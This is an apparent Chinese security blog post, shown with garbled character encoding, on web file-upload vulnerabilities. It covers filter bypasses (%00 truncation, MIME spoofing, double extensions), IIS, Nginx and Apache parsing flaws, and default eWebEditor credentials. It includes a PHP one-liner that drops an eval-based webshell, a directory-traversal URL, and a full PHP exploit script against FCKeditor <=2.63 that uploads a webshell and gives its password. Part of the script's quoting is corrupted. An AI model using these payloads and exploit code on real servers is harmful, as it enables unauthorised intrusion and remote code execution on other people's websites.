<!DOCTYPE HTML>
<html class="no-js" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <!--[if lte IE 9]>
<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
<![endif]-->
<meta charset="utf-8">
<meta http-equiv="X-DNS-Prefetch-Control" content="on">
<link rel="dns-prefetch" href="http://yoursite.com">
<link rel="dns-prefetch" href="//www.google-analytics.com">
<link rel="prefetch" href="http://yoursite.com">
<link rel="prefetch" href="//www.google-analytics.com">


<link rel="prerender" href="http://yoursite.com">

<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
<meta name="author" content="WTF">
<link rel="stylesheet" href="/css/JSimple.css">

<link rel="shortcut icon" href="/images/favicon.png">


<title>ä¸Šä¼ æ¼æ´ - WTF&#39;blog</title>

<meta name="keywords" content>

<meta name="description " content>

    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
            tex2jax: {
                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
                processEscapes: true
            }
        });
    </script>


    

    

</head>
<body>
<div id="nav">
    <nav class="nav-menu">
        <a class="site-name current" href="/" title="è¯´">è¯´</a>
        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
        <!-- custom single page of menus -->
        
        
        <a href="/help" title="å¸®åŠ©">
            <i class="fa fa-question-circle"></i>
            <span>å¸®åŠ©</span>
        </a>
        
    </nav>
</div>

<div class="nav-user">
    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
</div>

<div id="wrapper" class="clearfix">
    <div id="body">
        <div class="main" id="main">
            <div id="cover">
    <div class="cover-img"></div>
    <div class="cover-info">
        
        <h1 class="cover-siteName">è¯´IT</h1>
        <h3 class="cover-siteTitle">ç”¨ä»£ç æ‘‡æ»šè¿™ä¸ªä¸–ç•Œ</h3>
        <p class="cover-siteDesc">ä¸€ä¸ªå…³æ³¨æŠ€æœ¯ä¸äººæ–‡çš„ITåšå®¢</p>
        <div class="cover-sns">
            
    &nbsp;&nbsp;<div class="btn btn-telegram">
        <a href="http://t.me/kunyintang" target="_blank" title="telegram" ref="friend">
            <i class="fa fa-telegram"></i>
        </a>
    </div>

    &nbsp;&nbsp;<div class="btn btn-instagram">
        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
            <i class="fa fa-instagram"></i>
        </a>
    </div>

    &nbsp;&nbsp;<div class="btn btn-twitter">
        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
            <i class="fa fa-twitter"></i>
        </a>
    </div>

    &nbsp;&nbsp;<div class="btn btn-github">
        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
            <i class="fa fa-github"></i>
        </a>
    </div>


        </div>
    </div>
</div>

            <div class="page-title">
    <ul>
        <li><a href="/">Recent Posts</a></li>
        
        
        
        <li class="page-search">
    <form id="search" class="search-form">
        <input type="text" readonly="readonly" id="local-search-input-tip" placeholder="click to search...">
        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
    </form>
</li>

    </ul>
</div>
<div class="main-inner">
    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
        <div class="post-header">
            <div class="post-author clearfix">
                <a class="avatar fleft" href="https://shuoit.net" target="_blank">
                    <img width="48" src="/images/favicon.png" alt="avatar">
                </a>
                <p><span class="label">Author</span>
                    <a href="https://shuoit.net" target="_blank">çº ç»“ä¼¦</a>
                    <span title="Last edited at&nbsp;2019-08-21">2019-08-21</span>
                </p>
                <p>ä¸€ä¸ªæ¬ğŸ§±çš„åŠ³æ–¯åŸºğŸ˜ï¸ï¸</p>
            </div>
            <h2 class="post-title">ä¸Šä¼ æ¼æ´</h2>
            <div class="post-meta">
                emm... 1475 words in the article |
                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
            </div>
        </div>
        <div class="post-content markdown-body">
            <p>æ–‡ä»¶è¿‡æ»¤ä¸­ï¼Œå¦‚ä½•éªŒè¯æ–‡ä»¶åç¼€</p>
<a id="more"></a>
<p>1.æ–‡ä»¶å¤´éªŒè¯<br>2.æ–‡ä»¶ç±»å‹éªŒè¯<br>3.æ–‡ä»¶åç¼€éªŒè¯</p>
<p>ä¿®æ”¹æ–‡ä»¶å¤´ï¼Œä¼ªé€ æ–‡ä»¶å±æ€§<br>ä¿®æ”¹æ–‡ä»¶ç±»å‹ï¼Œä¼ªé€ æ–‡ä»¶ç±»å‹ï¼ŒMIMEç»•è¿‡ï¼ˆæŠ“åŒ…æ”¹åŒ…ï¼‰<br>å¢åŠ å¤šé‡åç¼€ï¼Œä¼ªé€ æ–‡ä»¶åç¼€ï¼Œå‘½åç»•è¿‡</p>
<p>Jsæœ¬åœ°éªŒè¯<br>%00æˆªæ–­ä¸Šä¼ <br>(k1.php%00.jpg)   %00â€”&gt;urlç¼–ç <br>BurpæŠ“åŒ…</p>
<p>å¸¸è§çš„MIMEç±»å‹<br>ã€€ã€€è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/html<br>ã€€ã€€æ™®é€šæ–‡æœ¬ .txt text/plain<br>ã€€ã€€RTFæ–‡æœ¬ .rtf application/rtf<br>ã€€ã€€GIFå›¾å½¢ .gif image/gif<br>ã€€ã€€JPEGå›¾å½¢ .jpeg,.jpg image/jpeg<br>ã€€ã€€auå£°éŸ³æ–‡ä»¶ .au audio/basic<br>ã€€ã€€MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midi<br>ã€€ã€€RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudio<br>ã€€ã€€MPEGæ–‡ä»¶ .mpg,.mpeg video/mpeg<br>ã€€ã€€AVIæ–‡ä»¶ .avi video/x-msvideo<br>ã€€ã€€GZIPæ–‡ä»¶ .gz application/x-gzip<br>ã€€ã€€TARæ–‡ä»¶ .tar application/x-tar</p>
<p>ç¼–è¾‘å™¨ä¸Šä¼ æ¼æ´åˆ©ç”¨<br>ç½‘ç«™ç¼–è¾‘å™¨ï¼š<br>Eweb,fck,ce,cfinder,ck  ç¬¬ä¸‰æ–¹ç»„ä»¶<br>ç¼–è¾‘å™¨æ¼æ´åˆ©ç”¨ï¼š<br>è·å–ç¼–è¾‘å™¨çš„åç§°åŠç‰ˆæœ¬ä¿¡æ¯<br>æ‰«æçˆ¬è¡Œæˆ–å­—å…¸æ‰«æ æ¢é’ˆ<br>è§‚å¯Ÿå›¾ç‰‡çš„åœ°å€æˆ–ç¼–è¾‘å™¨ç‰¹å¾<br>è·å–ç¼–è¾‘å™¨ç›¸å…³çš„æ¼æ´<br>åˆ©ç”¨ç¼–è¾‘å™¨æ¼æ´è¿›è¡Œæ”»å‡»æµ‹è¯•<br>Ewebeditorï¼š<br>é»˜è®¤åå°ï¼šewebeditor/admin_login.asp<br>é»˜è®¤æ•°æ®åº“ï¼šewebeditor/db/ewebeditor.mdb<br>é»˜è®¤è´¦å·å¯†ç ï¼šadmin admin/admin888<br>FCK<br>æŸ¥çœ‹ç‰ˆæœ¬ï¼š/_whatsnew.html<br>ç¼–è¾‘å™¨é¡µï¼š/_samples/default.html<br>.htaccess<br>htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p>
<p>ä»£ç ï¼š<br>&lt;filesmatch â€œwtfâ€&gt;<br>sethandler application/x-httpd-php<br><br>å®æˆ˜æ„ä¹‰ï¼š<br>1.å¦‚æœå­˜åœ¨å¯ä»¥ä¸Šä¼ .htaccssæ–‡ä»¶ï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨è§„åˆ™è§£æ<br>2.å¦‚æœå­˜åœ¨ä¿®æ”¹.htaccessæ–‡ä»¶æƒé™ï¼Œä¿®æ”¹è§£æè§„åˆ™<br>IIS 5.x/6.0è§£ææ¼æ´<br>IIS 6.0è§£æåˆ©ç”¨æ–¹æ³•æœ‰ä¸¤ç§<br>1.ç›®å½•è§£æ<br>/xx.asp/xx.jpg<br>2.æ–‡ä»¶è§£æ<br>xx.asp;.jpg<br>ç¬¬ä¸€ç§ï¼Œåœ¨ç½‘ç«™ä¸‹å»ºç«‹æ–‡ä»¶å¤¹çš„åå­—ä¸º .aspã€.asa çš„æ–‡ä»¶å¤¹ï¼Œå…¶ç›®å½•å†…çš„ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶éƒ½è¢«IISå½“ä½œaspæ–‡ä»¶æ¥è§£æå¹¶æ‰§è¡Œã€‚<br>ä¾‹å¦‚åˆ›å»ºç›®å½• xx.aspï¼Œé‚£ä¹ˆ<br>/xx.asp/1.jpg<br>å°†è¢«å½“ä½œaspæ–‡ä»¶æ¥æ‰§è¡Œã€‚å‡è®¾é»‘é˜”å¯ä»¥æ§åˆ¶ä¸Šä¼ æ–‡ä»¶å¤¹è·¯å¾„,å°±å¯ä»¥ä¸ç®¡ä½ ä¸Šä¼ åä½ çš„å›¾ç‰‡æ”¹ä¸æ”¹åéƒ½èƒ½æ‹¿shelläº†ã€‚<br>ç¬¬äºŒç§ï¼Œåœ¨IIS6.0ä¸‹ï¼Œåˆ†å·åé¢çš„ä¸è¢«è§£æï¼Œä¹Ÿå°±æ˜¯è¯´<br>xx.asp;.jpg<br>ä¼šè¢«æœåŠ¡å™¨çœ‹æˆæ˜¯xx.asp<br>è¿˜æœ‰IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§<br>/xx.asa /xx.cer /xx.cdx<br>IIS 7.0/IIS 7.5/ Nginx &lt;8.03ç•¸å½¢è§£ææ¼æ´<br>Nginxè§£ææ¼æ´è¿™ä¸ªä¼Ÿå¤§çš„æ¼æ´æ˜¯æˆ‘å›½å®‰å…¨ç»„ç»‡80secå‘ç°çš„â€¦<br>åœ¨é»˜è®¤Fast-CGIå¼€å¯çŠ¶å†µä¸‹,é»‘é˜”ä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºxx.jpgï¼Œå†…å®¹ä¸º<br><?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>â€˜);?&gt;<br>çš„æ–‡ä»¶ï¼Œç„¶åè®¿é—®xx.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬ shell.php<br>Nginx &lt;8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´<br>å½±å“ç‰ˆ:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>Nginxåœ¨å›¾ç‰‡ä¸­åµŒå…¥PHPä»£ç ç„¶åé€šè¿‡è®¿é—®<br>xxx.jpg%00.php<br>æ¥æ‰§è¡Œå…¶ä¸­çš„ä»£ç <br>Apacheè§£ææ¼æ´<br>Apache æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœä¸ºä¸å¯è¯†åˆ«è§£æ,å°±å†å¾€å·¦åˆ¤æ–­.<br>æ¯”å¦‚ xx.php.owf.rar â€œ.owfâ€å’Œâ€.rarâ€ è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æ,apacheå°±ä¼šæŠŠxx.php.owf.rarè§£ææˆphp.<br>å¦‚ä½•åˆ¤æ–­æ˜¯ä¸æ˜¯åˆæ³•çš„åç¼€å°±æ˜¯è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å…³é”®,æµ‹è¯•æ—¶å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªwooyun.php.rara.jpg.pngâ€¦ï¼ˆæŠŠä½ çŸ¥é“çš„å¸¸è§åç¼€éƒ½å†™ä¸Šâ€¦ï¼‰å»æµ‹è¯•æ˜¯å¦æ˜¯åˆæ³•åç¼€<br>å…¶ä»–<br>åœ¨windowsç¯å¢ƒä¸‹ï¼Œxx.jpg[ç©ºæ ¼] æˆ–xx.jpg. è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹,é»‘å®¢å¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œåœ¨æ–‡ä»¶åååŠ ä¸€ä¸ªç©ºæ ¼æˆ–è€…ç‚¹ç»•è¿‡é»‘åå•.è‹¥ä¸Šä¼ æˆåŠŸï¼Œç©ºæ ¼å’Œç‚¹éƒ½ä¼šè¢«windowsè‡ªåŠ¨æ¶ˆé™¤,è¿™æ ·ä¹Ÿå¯ä»¥getshellã€‚<br>å¦‚æœåœ¨Apacheä¸­.htaccesså¯è¢«æ‰§è¡Œ.ä¸”å¯è¢«ä¸Šä¼ .é‚£å¯ä»¥å°è¯•åœ¨.htaccessä¸­å†™å…¥:<br>&lt;FilesMatch â€œxx.jpgâ€&gt; SetHandler application/x-httpd-php <br>ç„¶åå†ä¸Šä¼ shell.jpgçš„æœ¨é©¬, è¿™æ ·shell.jpgå°±å¯è§£æä¸ºphpæ–‡ä»¶ã€‚</p>
<p>FCKç¼–è¾‘å™¨æ¼æ´<br>/3/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=%2F&amp;NewFolderName=a<br>CurrentFolder=/&amp;NewFolderName=a   /a<br>CurrentFolder=/a,asp&amp;NewFolderName=a     /a.asp/a<br>Ewebeditror   fckæ¼æ´åˆ©ç”¨<br>ç›®å½•éå†<br>/ewebeditor/admin_uploadfile.asp?id=42&amp;dir=../../..<br>FCK=&lt;=2.63 EXP<br><?php
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
define(STDIN, fopen("php://stdin", "r"));
$match = array();
function http_send($host, $packet)
{
$sock = fsockopen($host, 80);
while (!$sock)
{
print "\n[-] No response from {$host}:80 Trying again...";
$sock = fsockopen($host, 80);
}
fputs($sock, $packet);
while (!feof($sock)) $resp .= fread($sock, 1024);
fclose($sock);
print $resp;
return $resp;
}
function connector_response($html)
{
global $match;
return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));
}
print "\n+------------------------------------------------------------------+";
print "\n| FCKEditor Servelet Arbitrary File Upload Exploit |";
print "\n+------------------------------------------------------------------+\n";
if ($argc < 3)
{
print "\nUsage......: php $argv[0] host path\n";
print "\nExample....: php $argv[0] localhost /\n";
print "\nExample....: php $argv[0] localhost /FCKEditor/\n";
die();
}
$host = $argv[1];
$path = ereg_replace("(/){2,}", "/", $argv[2]);
$filename = "fvck.gif";
$foldername = "fuck.php%00.gif";
$connector = "editor/filemanager/connectors/php/connector.php";
$payload = "-----------------------------265001916915724\r\n";
$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
$payload .= "Content-Type: image/jpeg\r\n\r\n";
$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[wtf]) ?>â€˜.â€\nâ€;<br>$payload .= â€œâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€“265001916915724â€“\r\nâ€;<br>$packet = â€œPOST {$path}{$connector}?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=â€.$foldername.â€ HTTP/1.0\r\nâ€;//print $packet;<br>$packet .= â€œHost: {$host}\r\nâ€;<br>$packet .= â€œContent-Type: multipart/form-data; boundary=â€”â€”â€”â€”â€”â€”â€”â€”â€”265001916915724\r\nâ€;<br>$packet .= â€œContent-Length: â€œ.strlen($payload).â€\r\nâ€;<br>$packet .= â€œConnection: close\r\n\r\nâ€;<br>$packet .= $payload;<br>print $packet;<br>if (!connector_response(http_send($host, $packet))) die(â€œ\n[-] Upload failed!\nâ€);<br>else print â€œ\n[-] Job done! try http://${host}/$match[2] \nâ€;<br>?&gt;<br>webshellå¯†ç ï¼šwtf</p>

            
                

            
        </div>
        <div class="post-tool">
            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
            </a>
        </div>
        
        <div class="post-tags">Tagsï¼š
            
            <a href="/tags/æ¼æ´/">æ¼æ´</a>
            
        </div>
        
    </article>
    
        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
    
    
    

</div>
<script src="/js/busuanzi.pure.mini.js"></script>


        </div><!-- end #main-->
    </div><!-- end #body -->
    <footer class="footer">
    <div class="footer-inner" style="text-align: center">
        <p>
            <a href="/about" title="About">About</a>&nbsp;&nbsp<em>Â·</em>&nbsp;&nbsp
            <!-- è‡ªå®šä¹‰é“¾æ¥ -->
            <a href="/help" title="Help">Help</a>&nbsp;&nbsp<em>Â·</em>&nbsp;&nbsp
            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>Â·</em>&nbsp;&nbsp
            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
        </p>
        <p>
            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDaysï¼Œ<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br>
            Â©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
            ï¼ŒTheme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
            ï¼ŒAuthor&nbsp<a href="https://shuoit.net" target="_blank" rel="friend">çº ç»“ä¼¦</a>
            ï¼ŒHosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
        </p>
    </div>
</footer>
<script src="/js/SimpleCore.js"></script>

</div>
<!-- search pop -->
<div class="popup search-popup local-search-popup">
    <div class="local-search-header clearfix">
        <span class="search-icon">
            <i class="fa fa-search"></i>
        </span>
        <span class="popup-btn-close">
            <i class="fa fa-times-circle"></i>
        </span>
        <div class="local-search-input-wrapper">
            <input id="local-search-input" spellcheck="false" type="text" autocomplete="off" placeholder="Input query keywords here...">
        </div>
    </div>
    <div id="local-search-result"></div>
</div>
<div class="fixed-btn">
    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
</div>
<script>
    $(function () {
        var jsi_config = {
            buildingTime: '01/20/2018',
            current: $('.post-tags').length > 0 ? 'post' : 'archive',
            snsQRCode: '/images/sns-qrcode.png',
            donateImg: '/images/donate-qr.png',
            localSearch: { dbPath: '' },
            readMode: 'day'
        };
        
        SimpleCore.init(jsi_config);
        
    });
</script>
</body>
</html>
